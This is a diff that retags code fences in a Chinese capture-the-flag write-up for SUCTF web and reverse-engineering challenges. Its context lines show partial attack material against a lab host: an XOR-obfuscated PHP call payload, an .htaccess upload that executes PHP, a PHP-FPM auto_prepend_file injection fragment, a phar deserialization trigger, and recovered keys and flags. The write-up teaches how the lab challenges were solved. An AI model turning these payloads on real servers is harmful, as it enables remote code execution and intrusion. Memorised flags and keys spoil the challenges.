@@ -32,7 +32,7 @@ Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当
 
 可以传入phpinfo，也可以进入第二层get_the_flag 函数
 
-```
+```text
 ?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
 ?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag
 ```
@@ -43,7 +43,7 @@ Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当
 
 上传的 .htaccess文件可以为如下，我上传的文件是 zenis.pxp
 
-```
+```apache
 #define width 1
 #define height 1
 AddType application/x-httpd-php .pxp
@@ -65,7 +65,7 @@ unix:///run/php/php7.2-fpm.sock
 
 借用p神的脚本魔改一下，不过还要加上对 open_basedir 的重设
 
-```
+```php
 'PHP_VALUE': 'auto_prepend_file = php://input'+chr(0x0A)+'open_basedir = /',
 ```
 
@@ -75,7 +75,7 @@ unix:///run/php/php7.2-fpm.sock
 
 改自 p 神的payload，这里贴出关键部分，可以生成base64版，以 GIF89a 开头的payload，
 
-```
+```python
     def request(self, nameValuePairs={}, post=''):
         #if not self.__connect():
         #    print('connect failure! please check your fasctcgi-server !!')
@@ -110,7 +110,7 @@ unix:///run/php/php7.2-fpm.sock
 
 将 exp.py 生成的 payload 放到 exp 变量即可
 
-```
+```python
 import requests
 
 url = "http://192.168.188.128:8810/"
@@ -141,7 +141,7 @@ print(requests.get(url+r2.text).text)
 //题目代码都没改多少，但是很多队伍都跑远了...orz
 
 预期解：
-```
+```text
 file://suctf.c℆sr%2ffffffflag @111
 ```
 这里我选用的是`℆`这个字符，再加上题目给的 nginx 提示，其实按照预期思路基本没有什么坑，就比较容易让人想到`/usr/local/nginx/conf/nginx.conf`这个 nginx 配置文件了，里面就有 flag 的位置。
@@ -177,7 +177,7 @@ if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|
 ```
 
 ban 掉了 phar 开头的伪协议，还有一些考过的协议，发现还有 php 伪协议没有 ban ，于是可以利用类似于
-```
+```text
 php://filter/read=convert.base64-encode/resource=phar://./1.phar
 ```
 这种形式来触发反序列化，所以基本外层都弄完了，下面看看内部怎么弄。
@@ -322,14 +322,14 @@ var defer = typeof setImmediate === 'undefined'
 
 ###	Cocktail's Remix
 1.从robots.txt可以得到根目录下页面。
-```
+```apache
 User-agent: *
 Disallow: /info.php
 Disallow: /download.php
 Disallow: /config.php
 ```
 2.从info.php页面可以发现Apache后门模块mod_cocktail。
-```
+```text
 core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_cocktail mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status
 ```
 3.通过download.php页面可以下载任意可读文件，包括mod_cocktail.so和config.php。
@@ -1298,7 +1298,7 @@ You win!
 ### Akira Homework
 
 程序是一个Windows下的程序，开始的时候会要求输入密码。
-```
+```text
 [+]======================[+]
 [+] Akira's Homework 2nd [+]
 [+]======================[+]
@@ -1312,30 +1312,30 @@ puts(Str)
 sub_7FF76959C80("%18s", &v4, 19i64);
 ```
 直接逆向这一段，能够找到程序当前使用的密钥为:
-```
+```text
 Akira_aut0_ch3ss_!
 ```
 输入这段逻辑，此时会发现程序提示
-```
+```text
 Have no sign!
 ```
 返回程序检查，会发现有一个check逻辑`int sub_7FF682FC93B0()`，里面检查了一个叫做`Alternate Data Streams`的东西，并且将这个数据做了一次`md5`签名检查，通过查询可以查到签名内容为
-```
+```text
 Overwatch
 ```
 给`exe`加上`Alertable Data Streaming`之后，就能够通过检测。在刚刚的提示框后，会要求输入第二次答案，这个答案才是flag:
-```
+```text
 Now check the sign:
 ```
 dmp下程序后，会发现还有一个dll也藏在进程中。将DLL取出逆向，观测可知，其尝试打开了一个`ShareMemory`，并且读出了里面的内容，传入了函数`sub_180011136`。所以这里猜测，在这个程序运行的过程中，在主线程中必定也存在一个对称操作。于是检查原先的exe，找到调用`MapViewOfFile`的周围
-```
+```asm
 .text:000000014000771F                 mov     [rsp+0B8h+Src], 7Ch
 .text:0000000140007727                 mov     [rsp+0B8h+var_2F], 45h
 .text:000000014000772F                 mov     [rsp+0B8h+var_2E], 38h
 ...
 ```
 如果使用了工具分析这个dmp下来的dll，会发现其中有一个类似AES算法的东西，也就是这个`sub_180011136`函数的。最终可以解得flag为:
-```
+```text
 flag{Ak1rAWin!}
 ```
 _吐槽：题目没有设计好，导致DLL的解密逻辑好像很容易被找出来，结果很多师傅似乎拿到第一个key之后直接就解开了dll。。。本意是想让大家了解一下Windows下的ADS作为签名的用途的。果然还是出题人太菜了_
